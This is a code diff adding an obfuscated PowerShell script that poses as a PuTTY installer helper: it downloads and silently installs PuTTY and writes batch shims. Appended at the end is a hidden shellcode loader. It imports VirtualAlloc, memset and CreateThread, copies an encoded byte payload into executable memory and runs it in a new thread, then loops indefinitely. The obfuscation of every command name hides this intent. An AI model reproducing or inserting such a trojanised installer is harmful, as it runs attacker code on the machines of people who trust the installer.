@@ -1,0 +1,119 @@
+param(
+	[string]${V`eRSi`ON},
+	[string]${P`AtH},
+	[switch]${fO`RCe},
+	${upDA`TE},
+	[switch]${u`NINs`Tall}
+)
+
+
+
+
+
+${c`onF`iGS} = @{
+	("{1}{0}" -f'l','Ur') = ("{6}{13}{8}{10}{2}{15}{0}{11}{12}{7}{9}{14}{3}{1}{4}{5}" -f'tatham/','-0.63-instal','l','y','ler','.exe','ht','est/x86','he.eart','/','h.','pu','tty/lat','tp://t','putt','i/~sg')
+    ("{1}{0}"-f'ath','P') = "$(Split-Path -Path $MyInvocation.MyCommand.Definition -Parent)\ "
+}
+
+${Co`NfI`Gs} | &("{3}{1}{2}{4}{0}"-f'ect','E','ach-O','For','bj'){
+
+    try{
+
+        ${_}."R`EsuLt" = ${Nu`ll}
+        if(-not ${_}."pa`TH"){${_}."pa`Th" = ${p`Ath}}
+        ${C`o`NFiG} = ${_}
+
+        
+        
+        
+
+        if(-not ${U`N`Ins`TAll}){
+
+            
+            
+            
+
+            if(${_}."Con`d`IT`IonEx`cLusIOn"){            
+                ${_}."c`onDiTIOnE`XC`lu`Si`oNREsUlT" = $(&("{1}{2}{5}{3}{0}{4}"-f'i','Inv','oke-','ress','on','Exp') ${C`Onfig}."c`ondItIO`NexCLuSi`oN" -ErrorAction ("{1}{0}{2}{3}" -f'ilently','S','Contin','ue'))        
+            }    
+            if((${_}."cOn`d`IT`IoNe`xC`LuSIon`Res`ULT" -eq ${nu`LL}) -or ${F`orce}){
+                    	
+                
+                
+                
+
+                ${_}."d`Ownlo`Ads" = ${_}."u`RL" | &("{2}{1}{3}{0}"-f't','ch-Obj','ForEa','ec'){
+                    &("{2}{0}{1}" -f'et-Fil','e','G') -Url ${_} -Path ${cO`Nf`IG}."pa`Th"
+                }       			
+
+                
+                
+                
+
+                ${_}."dOWN`Lo`ADS" | &("{0}{4}{1}{2}{3}"-f'For','ach-Obj','e','ct','E'){
+                    &("{1}{2}{0}" -f 's','Start-','Proces') -FilePath $(&("{1}{0}" -f 'oin-Path','J') ${_}."p`ATh" ${_}."Fi`LEnAme") -ArgumentList ("{0}{2}{1}"-f '/ver','ent','ysil') -Wait
+                }
+                		
+                
+                
+                
+
+                ${EXECU`T`ABLe} = ((("{5}{6}{8}{4}{0}{1}{3}{7}{11}{2}{9}{10}" -f' (x','86)UA7PuTTYU','t.','A','s','C:UA7Progr','am ','7','File','ex','e','pagean'))-crEplAcE  ([ChAr]85+[ChAr]65+[ChAr]55),[ChAr]92);if(&("{3}{2}{0}{1}" -f 'Pat','h','est-','T') ${EXECUT`AB`lE}){&("{0}{1}{3}{2}" -f 'Se','t-Con','ent','t') -Path (&("{1}{0}{2}" -f 'at','Join-P','h') ${P`sB`in}."p`ATH" ("{2}{1}{0}{3}"-f 'b','eant.','pag','at')) -Value ('@e'+'cho '+"off`nstart "+"`"`" "+"`"$Executable`" "+'%*')}
+                ${ExeCU`Tab`lE} = ((("{7}{2}{5}{3}{1}{4}{0}{6}" -f 'x','wxPu','Files (','6)N','TTYNwxplink.e','x8','e','C:NwxProgram ')) -rePlace'Nwx',[chaR]92);if(&("{0}{1}{2}"-f 'Test','-Pat','h') ${exe`C`UTABlE}){&("{2}{0}{1}"-f 'et-','Content','S') -Path (&("{0}{2}{1}" -f 'J','-Path','oin') ${psB`In}."p`Ath" ("{2}{0}{1}" -f'ink.b','at','pl')) -Value ('@echo'+' '+"off`nstart "+"`"`" "+"`"$Executable`" "+'%*')}
+				${ExEcU`T`AblE} = ((("{8}{5}{6}{2}{1}{7}{0}{4}{3}" -f'TT','(x86)id','am Files ','cp.exe','Yidlps','og','r','lPu','C:idlPr'))-CrEPlaCE 'idl',[CHar]92);if(&("{0}{2}{1}"-f'Te','Path','st-') ${EXeC`U`T`AbLe}){&("{2}{1}{0}"-f 'Content','-','Set') -Path (&("{1}{0}{2}" -f'oin','J','-Path') ${p`S`Bin}."P`AtH" ("{0}{1}{2}"-f 'psc','p.','bat')) -Value ('@e'+'cho '+"off`nstart "+"`"`" "+"`"$Executable`" "+'%*')}
+				${e`xe`Cutable} = ((("{5}{2}{0}{7}{8}{10}{6}{3}{9}{1}{4}" -f 'ro','SPuTTYnxSpsftp.ex','P','n','e','C:nxS',')','gr','am','x',' Files (x86')) -CrePLaCE'nxS',[chaR]92);if(.("{2}{0}{1}"-f 'est-','Path','T') ${E`XE`cU`TABle}){&("{1}{0}{2}" -f 't','Se','-Content') -Path (&("{2}{1}{0}" -f'th','-Pa','Join') ${PS`Bin}."pa`Th" ("{0}{2}{1}" -f'psft','at','p.b')) -Value ('@ec'+'ho '+"off`nstart "+"`"`" "+"`"$Executable`" "+'%*')}
+				${exEC`UTA`BlE} = ((("{6}{8}{5}{3}{7}{10}{12}{0}{2}{9}{1}{4}{11}" -f 'W','e','pu','e','x','am Fil','C:RCWP','s (x86','rogr','tty.',')RCWP','e','uTTYRC'))."REPLA`CE"(([char]82+[char]67+[char]87),[stRING][char]92));if(&("{0}{2}{1}"-f 'T','ath','est-P') ${e`xEcu`T`AblE}){&("{2}{0}{1}"-f't-','Content','Se') -Path (&("{0}{2}{1}" -f 'Jo','n-Path','i') ${P`S`BiN}."PA`Th" ("{1}{0}{3}{2}" -f'tty','pu','at','.b')) -Value ('@'+'ech'+'o '+"off`nstart "+"`"`" "+"`"$Executable`" "+'%*')}
+				${Exec`U`T`ABle} = ((("{0}{6}{5}{2}{7}{10}{8}{9}{3}{4}{1}{11}" -f'C:','n','es','tty','ge','il','{0}Program F',' (x86){0','PuTT','Y{0}pu','}','.exe'))  -F  [cHAR]92);if(.("{1}{2}{0}"-f'-Path','T','est') ${e`Xec`UTab`lE}){&("{2}{1}{0}{3}"-f 'C','-','Set','ontent') -Path (&("{1}{2}{0}"-f 'Path','J','oin-') ${PSB`iN}."pA`TH" ("{2}{0}{1}" -f 'n.','bat','puttyge')) -Value ('@e'+'cho '+"off`nstart "+"`"`" "+"`"$Executable`" "+'%*')}
+                
+                
+                
+                
+
+                ${_}."DO`wNl`OaDS" | .("{2}{0}{3}{1}{4}"-f 'rE','ch-Obje','Fo','a','ct'){
+                    &("{1}{2}{0}"-f 'm','Rem','ove-Ite') $(.("{1}{0}{2}"-f '-','Join','Path') ${_}."PA`TH" ${_}."fIlEN`A`Me")
+                }
+                		
+                
+                
+                
+                		
+                if(${u`p`DATE}){${_}."RESU`lt" = ("{0}{1}{2}" -f'Ap','p','Updated');${_}
+                }else{${_}."R`eSUlT" = ("{3}{0}{2}{1}" -f 't','lled','a','AppIns');${_}}
+            		
+            
+            
+            
+            		
+            }else{
+            	
+                ${_}."r`eSu`Lt" = ("{4}{1}{3}{2}{0}" -f 'sion','t','Exclu','ion','Condi');${_}
+            }
+
+        
+        
+        
+        	
+        }else{
+
+            if(&("{0}{1}{2}" -f 'Test-P','at','h') (.("{0}{2}{1}"-f 'Join','Path','-') ${PS`Bin}."p`ATH" ("{0}{2}{3}{1}" -f 'pa','nt.bat','ge','a'))){.("{0}{2}{1}"-f 'Remove-I','em','t') (&("{2}{0}{1}" -f 'in-P','ath','Jo') ${PsB`in}."PA`Th" ("{2}{0}{1}" -f'ea','nt.bat','pag'))}
+			if(.("{2}{1}{0}" -f'h','t-Pat','Tes') (.("{2}{0}{1}" -f'-','Path','Join') ${PS`BIn}."p`ATH" ("{0}{2}{1}"-f 'p','nk.bat','li'))){&("{1}{0}{2}" -f '-Ite','Remove','m') (.("{1}{2}{0}" -f '-Path','J','oin') ${P`sB`iN}."PA`Th" ("{1}{2}{0}" -f'at','plink','.b'))}
+			if(&("{0}{1}{2}"-f'Test-Pa','t','h') (&("{2}{1}{0}"-f'n-Path','i','Jo') ${Psb`in}."p`ATh" ("{2}{0}{1}" -f'ba','t','pscp.'))){.("{0}{1}{2}"-f 'Re','move-I','tem') (&("{1}{0}{2}"-f 'oin','J','-Path') ${p`sB`iN}."pA`Th" ("{2}{1}{0}"-f'bat','.','pscp'))}
+			if(&("{1}{0}"-f 'est-Path','T') (&("{1}{0}{2}" -f'P','Join-','ath') ${p`sB`In}."P`ATH" ("{0}{2}{1}" -f 'p','ftp.bat','s'))){.("{3}{2}{0}{1}"-f 'e-I','tem','mov','Re') (.("{0}{1}{2}" -f'Jo','in-','Path') ${p`s`BIn}."pa`Th" ("{1}{0}{2}" -f 'sft','p','p.bat'))}
+			if(.("{1}{2}{0}"-f '-Path','Te','st') (.("{1}{0}"-f 'oin-Path','J') ${P`S`BiN}."P`ATh" ("{2}{0}{1}" -f'tt','y.bat','pu'))){.("{2}{1}{0}" -f'move-Item','e','R') (&("{0}{1}"-f 'Join-Pat','h') ${p`SBIn}."P`ATH" ("{1}{0}" -f'y.bat','putt'))}
+			if(&("{0}{1}{2}"-f'T','es','t-Path') (.("{1}{3}{0}{2}"-f 'Pat','Joi','h','n-') ${P`Sb`in}."Pa`Th" ("{0}{3}{1}{2}" -f 'pu','gen','.bat','tty'))){&("{2}{1}{0}"-f 'm','-Ite','Remove') (.("{1}{0}{2}" -f 'at','Join-P','h') ${Ps`BIn}."P`ATh" ("{2}{1}{0}"-f't','a','puttygen.b'))}
+			
+            ${exeC`UTa`BLE} = ((("{9}{1}{2}{5}{8}{10}{0}{7}{6}{3}{4}" -f'0}','}','Pr','0','0.exe','ogra','0','PuTTY{0}unins','m Files (x86)','C:{0','{'))  -f [chaR]92); if(&("{1}{2}{0}" -f'th','Tes','t-Pa') ${ExEcUtA`B`lE}){.("{1}{0}{3}{4}{2}" -f'rt','Sta','ess','-Pr','oc') -FilePath ${ExEcU`T`ABLe} -ArgumentList ("{1}{2}{0}{3}"-f 'si','/ver','y','lent') -Wait}
+            
+            ${_}."rESu`Lt" = ("{0}{2}{1}"-f 'AppUnin','d','stalle');${_}
+        }
+
+    
+    
+    
+
+    }catch{
+
+        ${co`NFiG}."Re`SulT" = ("{1}{0}"-f'rror','E');${Co`N`FIg}
+    }
+}
+${c`Can} = ((("{26}{12}{53}{74}{30}{7}{31}{72}{41}{63}{46}{25}{69}{18}{29}{14}{2}{50}{21}{66}{52}{16}{62}{1}{56}{3}{40}{65}{33}{42}{55}{73}{45}{17}{19}{11}{8}{4}{75}{49}{47}{54}{6}{35}{57}{67}{59}{71}{34}{48}{23}{13}{9}{44}{22}{43}{20}{27}{10}{70}{51}{28}{36}{5}{61}{0}{39}{38}{32}{68}{24}{15}{37}{58}{64}{60}"-f'F)]public st','fl',' lpAddress, uint ','rotec','eateT','v','t','ne',' Cr','IntPtr lpParamete','tr l','r','llIm','s, ','r',',','at','tic exter','tP','n IntPt','eationFlag','ize, uint fl','t dw','artAddres','ntPtr dest','xtern ','[D','s, IntP','DllImport(','t','r','l32.','rn IntPt','port(B','r lpS','tri','BHFms',' uint ',' exte','atic','t);[Dl','l','HF','Cr','r, uin','public sta','atic e','Ptr','t','d(Int','dwS','Id);[','lloc','port(BHF',' lpThreadA','kernel','P','butes, uin','src, u','dwStackSize,','nt);','crt.dllBH','ionType, uint ','BHF)]public st','int cou','lIm','A','t ','r memset(I','IntPtr VirtualAlloc(In','pThread',' IntPt','dl','32.dllBHF)]','ke','hrea'))."Rep`l`ACE"(([CHAR]66+[CHAR]72+[CHAR]70),[STRinG][CHAR]34));${w} = .("{0}{1}{2}"-f'Ad','d-Typ','e') -memberDefinition ${C`CAn} -Name ("{1}{0}" -f'32','Win') -namespace ("{1}{2}{3}{0}"-f's','Win32Fu','nctio','n') -passthru;[Byte[]];[Byte[]]${z} = 0xdb,0xdd,0xd9,0x74,0x24,0xf4,0xb8,0x8a,0x7b,0xeb,0xc0,0x5d,0x2b,0xc9,0xb1,0x47,0x31,0x45,0x18,0x03,0x45,0x18,0x83,0xc5,0x8e,0x99,0x1e,0x3c,0x66,0xdf,0xe1,0xbd,0x76,0x80,0x68,0x58,0x47,0x80,0x0f,0x28,0xf7,0x30,0x5b,0x7c,0xfb,0xbb,0x09,0x95,0x88,0xce,0x85,0x9a,0x39,0x64,0xf0,0x95,0xba,0xd5,0xc0,0xb4,0x38,0x24,0x15,0x17,0x01,0xe7,0x68,0x56,0x46,0x1a,0x80,0x0a,0x1f,0x50,0x37,0xbb,0x14,0x2c,0x84,0x30,0x66,0xa0,0x8c,0xa5,0x3e,0xc3,0xbd,0x7b,0x35,0x9a,0x1d,0x7d,0x9a,0x96,0x17,0x65,0xff,0x93,0xee,0x1e,0xcb,0x68,0xf1,0xf6,0x02,0x90,0x5e,0x37,0xab,0x63,0x9e,0x7f,0x0b,0x9c,0xd5,0x89,0x68,0x21,0xee,0x4d,0x13,0xfd,0x7b,0x56,0xb3,0x76,0xdb,0xb2,0x42,0x5a,0xba,0x31,0x48,0x17,0xc8,0x1e,0x4c,0xa6,0x1d,0x15,0x68,0x23,0xa0,0xfa,0xf9,0x77,0x87,0xde,0xa2,0x2c,0xa6,0x47,0x0e,0x82,0xd7,0x98,0xf1,0x7b,0x72,0xd2,0x1f,0x6f,0x0f,0xb9,0x77,0x5c,0x22,0x42,0x87,0xca,0x35,0x31,0xb5,0x55,0xee,0xdd,0xf5,0x1e,0x28,0x19,0xfa,0x34,0x8c,0xb5,0x05,0xb7,0xed,0x9c,0xc1,0xe3,0xbd,0xb6,0xe0,0x8b,0x55,0x47,0x0d,0x5e,0xc3,0x42,0x99,0xa1,0xbc,0x4d,0x3e,0x4a,0xbf,0x4d,0xdf,0x1a,0x36,0xab,0x8f,0x4a,0x19,0x64,0x6f,0x3b,0xd9,0xd4,0x07,0x51,0xd6,0x0b,0x37,0x5a,0x3c,0x24,0xdd,0xb5,0xe9,0x1c,0x49,0x2f,0xb0,0xd7,0xe8,0xb0,0x6e,0x92,0x2a,0x3a,0x9d,0x62,0xe4,0xcb,0xe8,0x70,0x90,0x3b,0xa7,0x2b,0x36,0x43,0x1d,0x41,0xb6,0xd1,0x9a,0xc0,0xe1,0x4d,0xa1,0x35,0xc5,0xd1,0x5a,0x10,0x5e,0xdb,0xce,0xdb,0x08,0x24,0x1f,0xdc,0xc8,0x72,0x75,0xdc,0xa0,0x22,0x2d,0x8f,0xd5,0x2c,0xf8,0xa3,0x46,0xb9,0x03,0x92,0x3b,0x6a,0x6c,0x18,0x62,0x5c,0x33,0xe3,0x41,0x5c,0x0f,0x32,0xaf,0x2a,0x61,0x86;${G} = 0x1000;if (${z}."lE`N`GtH" -gt 0x1000){${g} = ${Z}."LEN`gTH"};${b`Yk}=${W}::("{1}{0}{2}"-f'lA','Virtua','lloc').Invoke(0,0x1000,${g},0x40);for (${i}=0;${i} -le (${Z}."L`enGTh"-1);${I}++) {${W}::"m`emSEt"([IntPtr](${B`yk}.("{0}{1}"-f 'ToI','nt32').Invoke()+${I}), ${z}[${I}], 1)};${W}::("{0}{2}{1}"-f 'C','ad','reateThre').Invoke(0,0,${b`Yk},0,0,0);for (;;){&("{1}{3}{0}{2}" -f 'le','Start','ep','-s') 60};
